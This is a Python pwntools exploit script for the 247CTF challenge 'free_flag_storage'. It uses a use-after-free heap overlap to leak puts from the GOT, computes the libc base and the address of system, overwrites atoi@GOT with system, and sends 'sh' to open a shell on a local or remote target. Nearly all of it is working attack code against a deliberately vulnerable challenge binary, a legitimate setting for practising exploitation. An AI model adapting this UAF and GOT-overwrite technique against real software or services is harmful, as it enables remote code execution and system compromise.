#!/usr/bin/env python3
"""
UAF Exploit for free_flag_storage - 247CTF
Fixed: length=5 to avoid NULL byte corruption of GOT entry
"""
from pwn import *

context.binary = ELF('./free_flag_storage', checksec=False)
context.log_level = 'info'

puts_got = 0x804b028
atoi_got = 0x804b034

# Remote: Ubuntu 18.04 i386 libc
REMOTE_PUTS = 0x67360
REMOTE_SYSTEM = 0x3cd10

# Local libc
local_libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)

def start():
    if args.REMOTE:
        return remote('de22d451a7a11cba.247ctf.com', 50413)
    return process('./free_flag_storage')

p = start()

def send3(s):
    p.send(str(s).encode().ljust(3, b'\n'))

p.recvuntil(b'Enter command:')

# Setup heap overlap
for i in range(3):
    p.sendline(b'add'); p.recvuntil(b'length:'); send3(8)
    p.recvuntil(b'value:'); p.send(b'X'*8)
    p.recvuntil(b'challenge_id:'); send3(i+1)
    p.recvuntil(b'score:'); send3(i+1)
    p.recvuntil(b'Enter command:')

p.sendline(b'delete'); p.recvuntil(b'delete:'); send3(0); p.recvuntil(b'Enter command:')
p.sendline(b'delete'); p.recvuntil(b'delete:'); send3(1); p.recvuntil(b'Enter command:')

# Fake struct with length=5 (critical fix!)
fake = p32(5) + p32(puts_got) + p32(0xcafe) + p32(0xbabe)
p.sendline(b'add'); p.recvuntil(b'length:'); send3(16)
p.recvuntil(b'value:'); p.send(fake)
p.recvuntil(b'challenge_id:'); send3(4)
p.recvuntil(b'score:'); send3(4)
p.recvuntil(b'Enter command:')

# Leak
p.sendline(b'print')
data = p.recvuntil(b'Enter command:', drop=True)
for line in data.split(b'\n'):
    if b'51966' in line:
        content = line[line.find(b'{')+1:line.find(b'}')]
        puts_libc = u32(content[:4])
        break

log.success(f"Leaked puts@libc: {hex(puts_libc)}")

# Calculate system address
if args.REMOTE:
    libc_base = puts_libc - REMOTE_PUTS
    system_addr = libc_base + REMOTE_SYSTEM
else:
    libc_base = puts_libc - local_libc.symbols['puts']
    system_addr = libc_base + local_libc.symbols['system']

log.info(f"libc base: {hex(libc_base)}")
log.info(f"system: {hex(system_addr)}")

# Update fake struct to point to atoi@GOT with length=5
fake2 = p32(5) + p32(atoi_got) + p32(0xdead) + p32(0xbeef)
p.sendline(b'edit'); p.recvuntil(b'edit:'); send3(1)
p.recvuntil(b'):'); p.send(fake2)
p.recvuntil(b'challenge_id:'); send3(99)
p.recvuntil(b'score:'); send3(99)
p.recvuntil(b'Enter command:')

# Write system to atoi@GOT (5 bytes to avoid NULL corruption)
log.info("Writing system to atoi@GOT...")
p.sendline(b'edit'); p.recvuntil(b'edit:'); send3(0)
p.recvuntil(b'):')
p.send(p32(system_addr) + b'X')  # 4 bytes + 1 dummy

p.recvuntil(b'challenge_id:')
log.success("GOT overwritten! Triggering shell...")
p.sendline(b'sh')

p.interactive()
